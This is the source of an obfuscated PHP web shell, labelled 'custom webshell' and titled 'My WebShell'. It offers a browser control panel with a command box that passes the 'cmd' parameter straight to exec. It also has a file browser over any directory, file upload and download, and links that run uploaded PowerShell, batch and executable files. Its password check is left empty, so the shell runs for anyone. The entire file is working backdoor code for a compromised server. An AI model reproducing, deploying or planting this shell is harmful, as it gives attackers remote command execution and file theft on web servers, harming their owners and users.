<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php $aydjyzzi1a1dc91c907325c69271ddf0='';global $gjhdzqfz868d3cb40d275143fc963b14;global $kbjlyyzi020b759adef679a47cb9afe9;if($aydjyzzi1a1dc91c907325c69271ddf0!=null){if(isset($_COOKIE['pass'])){if(hash('sha512',$_COOKIE['pass'])!==$aydjyzzi1a1dc91c907325c69271ddf0){echo "Wrong password !";exit;}}else{echo "Wrong password !";exit;}}function Follow6d2bd558(string $yszkeqkad6fe1d0be6347b8ef2427fa6):string{$yszkeqkad6fe1d0be6347b8ef2427fa6=mb_ereg_replace('\\\\|/','/',$yszkeqkad6fe1d0be6347b8ef2427fa6,'msr');$ajubpwqr3ff401a37a03fe7c08117faf=$yszkeqkad6fe1d0be6347b8ef2427fa6[0]==='/';preg_match('/^[a-z]:/',$yszkeqkad6fe1d0be6347b8ef2427fa6,$ooejvjjf9c28d32df234037773be184d);$tjfdriof3ecab05b5b8340f3ad9a85c4=isset($ooejvjjf9c28d32df234037773be184d[0])?$ooejvjjf9c28d32df234037773be184d[0]:false;$zgapysbeb6a8e8682249b56898e11f47=array_filter(explode('/',$yszkeqkad6fe1d0be6347b8ef2427fa6),'mb_strlen');$oxoxdtoa81406cf89f2a977dae20d55f=[];foreach($zgapysbeb6a8e8682249b56898e11f47 as $pbnxsobb1634b7ef7a71f9ae79c4b3b3){if('.'===$pbnxsobb1634b7ef7a71f9ae79c4b3b3){continue;}if('..'===$pbnxsobb1634b7ef7a71f9ae79c4b3b3&&!$ajubpwqr3ff401a37a03fe7c08117faf&&!$tjfdriof3ecab05b5b8340f3ad9a85c4&&empty(array_filter($oxoxdtoa81406cf89f2a977dae20d55f,function($lotrguzn2063c1608d6e0baf80249c42){return!('..'===$lotrguzn2063c1608d6e0baf80249c42);}))){$oxoxdtoa81406cf89f2a977dae20d55f[]=$pbnxsobb1634b7ef7a71f9ae79c4b3b3;continue;}if('..'===$pbnxsobb1634b7ef7a71f9ae79c4b3b3){array_pop($oxoxdtoa81406cf89f2a977dae20d55f);continue;}$oxoxdtoa81406cf89f2a977dae20d55f[]=$pbnxsobb1634b7ef7a71f9ae79c4b3b3;}return(($ajubpwqr3ff401a37a03fe7c08117faf?'/':$tjfdriof3ecab05b5b8340f3ad9a85c4)?$tjfdriof3ecab05b5b8340f3ad9a85c4.'/':'').implode('/',$oxoxdtoa81406cf89f2a977dae20d55f);}if(isset($_POST['upload'])){$htjwuupk14402cfaa3089ce288adfbda=Occur166c6825();$pniwgnuj87f85f26c826cf7ccb2ae98b=$htjwuupk14402cfaa3089ce288adfbda.'/'.basename($_FILES['file']['name']);if(file_exists($pniwgnuj87f85f26c826cf7ccb2ae98b)){echo "<script>alert('Error: File already exists !')</script>";}else if(move_uploaded_file($_FILES['file']['tmp_name'],$pniwgnuj87f85f26c826cf7ccb2ae98b)){echo "<script>alert('File uploaded successfuly !')</script>";}else{echo "<script>alert('Error: Could not upload file !')</script>";}}else if(isset($_GET['runscript'])){$umwhkkdi3205c0ded576131ea255ad2b=$_GET['runscript'];$qinhtvfy0d858590b2752462cbbd205a=Follow6d2bd558($umwhkkdi3205c0ded576131ea255ad2b);$kdlywjxf1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -File "'.$qinhtvfy0d858590b2752462cbbd205a.'"';global $gjhdzqfz868d3cb40d275143fc963b14;global $kbjlyyzi020b759adef679a47cb9afe9;$gjhdzqfz868d3cb40d275143fc963b14=shell_exec($kdlywjxf1dccadfed7bcbb036c56a4af);}else if(isset($_GET['runexe'])){$umwhkkdi3205c0ded576131ea255ad2b=$_GET['runexe'];$qinhtvfy0d858590b2752462cbbd205a=Follow6d2bd558($umwhkkdi3205c0ded576131ea255ad2b);$kdlywjxf1dccadfed7bcbb036c56a4af=$qinhtvfy0d858590b2752462cbbd205a;exec('cd '.realpath(Occur166c6825()).' && '.$qinhtvfy0d858590b2752462cbbd205a,$gjhdzqfz868d3cb40d275143fc963b14,$kbjlyyzi020b759adef679a47cb9afe9);}else if(isset($_GET['runbat'])){$umwhkkdi3205c0ded576131ea255ad2b=$_GET['runbat'];$qinhtvfy0d858590b2752462cbbd205a=Follow6d2bd558($umwhkkdi3205c0ded576131ea255ad2b);$kdlywjxf1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","'.$qinhtvfy0d858590b2752462cbbd205a.') }';exec('cd '.realpath(Occur166c6825()).' && '.$qinhtvfy0d858590b2752462cbbd205a,$gjhdzqfz868d3cb40d275143fc963b14,$kbjlyyzi020b759adef679a47cb9afe9);}if(isset($_GET['download'])){$dmckmjwf8c7dd922ad47494fc02c388e=$_GET['download'];if(file_exists($dmckmjwf8c7dd922ad47494fc02c388e)){if(is_readable($dmckmjwf8c7dd922ad47494fc02c388e)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($dmckmjwf8c7dd922ad47494fc02c388e).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($dmckmjwf8c7dd922ad47494fc02c388e));readfile($dmckmjwf8c7dd922ad47494fc02c388e);exit;}else{echo "<script>alert('Error: Could not read the file !')</script>";exit;}}}function Meet8f16aba2(){return 'rgb(32, 0, 128)';}function Buy4f56654c(){return '#00ff00';}function Createc0fcd07d(){return '#d92626';}function War245f4364(){return '#ff0066';}function Abuse771fb176(){return '#3ADF00';}function Laugh3c5ff491(){return '#3ADF00';}function Occur166c6825ectoryColor(){return '#3ADF00';}function Buyf5e21eef(){return '#ff5500';}function Pursuef02b2ded(){return '#C0C0C0';}function Studyb7beaeef(){return '#C0C0C0';}function Reminddd9d3fbd(){return '#3ADF00';}function Break19a54650($yedsdpbcc9e9a848920877e76685b2e4){switch($yedsdpbcc9e9a848920877e76685b2e4){case 1:return '#101010';break;case 2:return '#202020';break;case 3:return '#303030';break;case 4:return '#404040';break;default:return '#404040';}return '#404040';}function Battle8a093a3f($nloedeydb068931cc450442b63f5b3d2){$aovlbfvj7b8b965ad4bca0e41ab51de7=strrpos($nloedeydb068931cc450442b63f5b3d2,'.');return($aovlbfvj7b8b965ad4bca0e41ab51de7===false)?'':substr($nloedeydb068931cc450442b63f5b3d2,$aovlbfvj7b8b965ad4bca0e41ab51de7+1);}function Give30c50fe9($cfvlrpnn435ed7e9f07f740abf511a62){$kbjlyyzi020b759adef679a47cb9afe9='';$baymmwssa3da707b651c79ecc39a4986=Occur166c6825().'/'.$cfvlrpnn435ed7e9f07f740abf511a62;if(is_dir($baymmwssa3da707b651c79ecc39a4986)){$kbjlyyzi020b759adef679a47cb9afe9.='<td style="color: "'.Occur166c6825ectoryColor().'">';$kbjlyyzi020b759adef679a47cb9afe9.=htmlspecialchars('<dir>');}else{$kbjlyyzi020b759adef679a47cb9afe9.='<td style="color: "'.Createc0fcd07d().'">';$bxsrotkh93d565f07a1ee62504ba94b6=Kill80e6c7a4(filesize($baymmwssa3da707b651c79ecc39a4986));$kbjlyyzi020b759adef679a47cb9afe9.=$bxsrotkh93d565f07a1ee62504ba94b6;}$kbjlyyzi020b759adef679a47cb9afe9.='</td>';return $kbjlyyzi020b759adef679a47cb9afe9;}function Develop4fe7b1ab($cfvlrpnn435ed7e9f07f740abf511a62){$kbjlyyzi020b759adef679a47cb9afe9='';$oefrxbbvabf77184f55403d75b9d51d7=pathinfo($cfvlrpnn435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);switch($oefrxbbvabf77184f55403d75b9d51d7){case "ps1":$kbjlyyzi020b759adef679a47cb9afe9.='<td style="color: "'.Createc0fcd07d().'">';$kbjlyyzi020b759adef679a47cb9afe9.=Push8e41108a($cfvlrpnn435ed7e9f07f740abf511a62);break;case "bat":$kbjlyyzi020b759adef679a47cb9afe9.='<td style="color: "'.Createc0fcd07d().'">';$kbjlyyzi020b759adef679a47cb9afe9.=Travel8fc71b68($cfvlrpnn435ed7e9f07f740abf511a62);break;case "exe":$kbjlyyzi020b759adef679a47cb9afe9.='<td style="color: "'.Createc0fcd07d().'">';$kbjlyyzi020b759adef679a47cb9afe9.=Prepare06b94452($cfvlrpnn435ed7e9f07f740abf511a62);break;default:$kbjlyyzi020b759adef679a47cb9afe9.='<td style="color: "'.Createc0fcd07d().'">';$kbjlyyzi020b759adef679a47cb9afe9.=htmlspecialchars('noop');}$kbjlyyzi020b759adef679a47cb9afe9.='</td>';return $kbjlyyzi020b759adef679a47cb9afe9;}function Recorde2b2868c($dmckmjwf8c7dd922ad47494fc02c388e){$xcbqupvn15d61712450a686a7f365adf=fileperms($dmckmjwf8c7dd922ad47494fc02c388e);if($xcbqupvn15d61712450a686a7f365adf&0x1000){$zibjauzc599dcce2998a6b40b1e38e8c='p';}else if($xcbqupvn15d61712450a686a7f365adf&0x2000){$zibjauzc599dcce2998a6b40b1e38e8c='c';}else if($xcbqupvn15d61712450a686a7f365adf&0x4000){$zibjauzc599dcce2998a6b40b1e38e8c='d';}else if($xcbqupvn15d61712450a686a7f365adf&0x6000){$zibjauzc599dcce2998a6b40b1e38e8c='b';}else if($xcbqupvn15d61712450a686a7f365adf&0x8000){$zibjauzc599dcce2998a6b40b1e38e8c='-';}else if($xcbqupvn15d61712450a686a7f365adf&0xA000){$zibjauzc599dcce2998a6b40b1e38e8c='l';}else if($xcbqupvn15d61712450a686a7f365adf&0xC000){$zibjauzc599dcce2998a6b40b1e38e8c='s';}else $zibjauzc599dcce2998a6b40b1e38e8c='u';$fbsszxqt72122ce96bfec66e2396d2e2["read"]=($xcbqupvn15d61712450a686a7f365adf&00400)?'r':'-';$fbsszxqt72122ce96bfec66e2396d2e2["write"]=($xcbqupvn15d61712450a686a7f365adf&00200)?'w':'-';$fbsszxqt72122ce96bfec66e2396d2e2["execute"]=($xcbqupvn15d61712450a686a7f365adf&00100)?'x':'-';$qckbuigedb0f6f37ebeb6ea094891243["read"]=($xcbqupvn15d61712450a686a7f365adf&00040)?'r':'-';$qckbuigedb0f6f37ebeb6ea094891243["write"]=($xcbqupvn15d61712450a686a7f365adf&00020)?'w':'-';$qckbuigedb0f6f37ebeb6ea094891243["execute"]=($xcbqupvn15d61712450a686a7f365adf&00010)?'x':'-';$hiudscil7d793037a0760186574b0282["read"]=($xcbqupvn15d61712450a686a7f365adf&00004)?'r':'-';$hiudscil7d793037a0760186574b0282["write"]=($xcbqupvn15d61712450a686a7f365adf&00002)?'w':'-';$hiudscil7d793037a0760186574b0282["execute"]=($xcbqupvn15d61712450a686a7f365adf&00001)?'x':'-';if($xcbqupvn15d61712450a686a7f365adf&0x800)$fbsszxqt72122ce96bfec66e2396d2e2["execute"]=($fbsszxqt72122ce96bfec66e2396d2e2['execute']=='x')?'s':'S';if($xcbqupvn15d61712450a686a7f365adf&0x400)$qckbuigedb0f6f37ebeb6ea094891243["execute"]=($qckbuigedb0f6f37ebeb6ea094891243['execute']=='x')?'s':'S';if($xcbqupvn15d61712450a686a7f365adf&0x200)$hiudscil7d793037a0760186574b0282["execute"]=($hiudscil7d793037a0760186574b0282['execute']=='x')?'t':'T';$izkzoqqz03c7c0ace395d80182db07ae=sprintf("%1s",$zibjauzc599dcce2998a6b40b1e38e8c);$izkzoqqz03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$fbsszxqt72122ce96bfec66e2396d2e2['read'],$fbsszxqt72122ce96bfec66e2396d2e2['write'],$fbsszxqt72122ce96bfec66e2396d2e2['execute']);$izkzoqqz03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$qckbuigedb0f6f37ebeb6ea094891243['read'],$qckbuigedb0f6f37ebeb6ea094891243['write'],$qckbuigedb0f6f37ebeb6ea094891243['execute']);$izkzoqqz03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$hiudscil7d793037a0760186574b0282['read'],$hiudscil7d793037a0760186574b0282['write'],$hiudscil7d793037a0760186574b0282['execute']);return $izkzoqqz03c7c0ace395d80182db07ae;}function Kill80e6c7a4($ulegwtgb4b3a6218bb3e3a7303e8a171){if($ulegwtgb4b3a6218bb3e3a7303e8a171>=1073741824){$ulegwtgb4b3a6218bb3e3a7303e8a171=number_format($ulegwtgb4b3a6218bb3e3a7303e8a171/1073741824,2).' GB';}elseif($ulegwtgb4b3a6218bb3e3a7303e8a171>=1048576){$ulegwtgb4b3a6218bb3e3a7303e8a171=number_format($ulegwtgb4b3a6218bb3e3a7303e8a171/1048576,2).' MB';}elseif($ulegwtgb4b3a6218bb3e3a7303e8a171>=1024){$ulegwtgb4b3a6218bb3e3a7303e8a171=number_format($ulegwtgb4b3a6218bb3e3a7303e8a171/1024,2).' KB';}elseif($ulegwtgb4b3a6218bb3e3a7303e8a171>1){$ulegwtgb4b3a6218bb3e3a7303e8a171=$ulegwtgb4b3a6218bb3e3a7303e8a171.' bytes';}elseif($ulegwtgb4b3a6218bb3e3a7303e8a171==1){$ulegwtgb4b3a6218bb3e3a7303e8a171=$ulegwtgb4b3a6218bb3e3a7303e8a171.' byte';}else{$ulegwtgb4b3a6218bb3e3a7303e8a171='0 bytes';}return $ulegwtgb4b3a6218bb3e3a7303e8a171;}function Occur166c6825(){return isset($_GET['dir'])?realpath($_GET['dir']):getcwd();}function Succeed825bbc5a($dmckmjwf8c7dd922ad47494fc02c388e){if(is_dir(Occur166c6825().'/'.$dmckmjwf8c7dd922ad47494fc02c388e)){return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(Occur166c6825().'/'.$dmckmjwf8c7dd922ad47494fc02c388e).'">'.$dmckmjwf8c7dd922ad47494fc02c388e.'</a>';}else{return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(Occur166c6825().'/'.$dmckmjwf8c7dd922ad47494fc02c388e).'">'.$dmckmjwf8c7dd922ad47494fc02c388e.'</a>';}}function Push8e41108a($dmckmjwf8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.Follow6d2bd558(Occur166c6825().'/'.$dmckmjwf8c7dd922ad47494fc02c388e).'&dir='.realpath(Occur166c6825()).'">'.'run</a>';}function Prepare06b94452($dmckmjwf8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.Follow6d2bd558(Occur166c6825().'/'.$dmckmjwf8c7dd922ad47494fc02c388e).'&dir='.realpath(Occur166c6825()).'">'.'run</a>';}function Travel8fc71b68($dmckmjwf8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.Follow6d2bd558(Occur166c6825().'/'.$dmckmjwf8c7dd922ad47494fc02c388e).'&dir='.realpath(Occur166c6825()).'">'.'run</a>';}function Spellb9cd73c1(){$tenypwwv45b963397aa40d4a0063e0d8=scandir(Occur166c6825());$thrucikvcc935c5faf4c8f7a0468d755=true;if($tenypwwv45b963397aa40d4a0063e0d8!=null){foreach($tenypwwv45b963397aa40d4a0063e0d8 as $cfvlrpnn435ed7e9f07f740abf511a62){echo '<tr style="background-color:'.($thrucikvcc935c5faf4c8f7a0468d755?'#515151':'#212121').';">';echo '<td style="font-weight:thin;">'.Succeed825bbc5a($cfvlrpnn435ed7e9f07f740abf511a62).'</td>';echo ''.Give30c50fe9($cfvlrpnn435ed7e9f07f740abf511a62).'';echo ''.Develop4fe7b1ab($cfvlrpnn435ed7e9f07f740abf511a62).'';echo '</tr>';$thrucikvcc935c5faf4c8f7a0468d755=!$thrucikvcc935c5faf4c8f7a0468d755;}}else{echo "<p>Couldn't open that directory !";}}function Hold1fb3a005(){global $gjhdzqfz868d3cb40d275143fc963b14;global $kbjlyyzi020b759adef679a47cb9afe9;if($kbjlyyzi020b759adef679a47cb9afe9==0){if($gjhdzqfz868d3cb40d275143fc963b14!=null){foreach($gjhdzqfz868d3cb40d275143fc963b14 as $ngxzcmur6438c669e0d0de98e6929c2c){if($ngxzcmur6438c669e0d0de98e6929c2c!=null){echo "<br>";echo htmlspecialchars($ngxzcmur6438c669e0d0de98e6929c2c);echo "\n";}}}}else{echo "Execution failed with error code: ".$kbjlyyzi020b759adef679a47cb9afe9;}}function Record71cb1eee(){$gnwvwmrv0897acf49c7c1ea9f76efe59=gethostname()?? 'none';$hedzbfuc14c4b06b824ec59323936251=get_current_user();$wasitpye736007832d2167baaae763fd=Occur166c6825();$uqonmofsdfff0a7fa1a55c8c1a4966c1=isset($_GET['cmd'])?$_GET['cmd']:'';return '<span style="color: #ff6347">'.$hedzbfuc14c4b06b824ec59323936251.'@'.$gnwvwmrv0897acf49c7c1ea9f76efe59.'</span>: <span style="color: #B40404">'.$wasitpye736007832d2167baaae763fd.'</span>$ '.$uqonmofsdfff0a7fa1a55c8c1a4966c1;}if(isset($_GET['cmd'])){exec('cd '.realpath(Occur166c6825()).' && '.$_GET['cmd'],$gjhdzqfz868d3cb40d275143fc963b14,$kbjlyyzi020b759adef679a47cb9afe9);}?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function Risk2c83367f() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo Meet8f16aba2();?>;
                --background-color-1: <?php echo Break19a54650(1);?>;
                --background-color-2: <?php echo Break19a54650(2);?>;
                --background-color-3: <?php echo Break19a54650(3);?>;
                --background-color-4: <?php echo Break19a54650(4);?>;
                --primary-color: <?php echo Buy4f56654c();?>;
                --secondary-color: <?php echo Createc0fcd07d();?>;
                --command-color: <?php echo War245f4364();?>;
                --commandoutput-color: <?php echo Abuse771fb176();?>;
                --explorer-color: <?php echo Laugh3c5ff491();?>;
                --directory-color: <?php echo Occur166c6825ectoryColor();?>;
                --navtext-color: <?php echo Buyf5e21eef();?>;
                --navtext-hover-color: <?php echo Studyb7beaeef();?>;
                --header-text-color: <?php echo Pursuef02b2ded();?>;
                --buttons-color: <?php echo Reminddd9d3fbd();?>;
            }
        </style>
        <script>
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Occur166c6825()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Effectae165658()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Occur166c6825()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Effectae165658()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function Highlightbd6dd09a() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function Criticize7b57cc13() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function Effectae165658() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1>> control panel</h1>
                <div class="nav-items">
                    <a onclick="Highlightbd6dd09a()">[upload]</a>
                    <a onclick="Risk2c83367f()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo Occur166c6825()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php Spellb9cd73c1()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo Record71cb1eee()?></p>
                    <p><?php Hold1fb3a005()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo Occur166c6825()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>





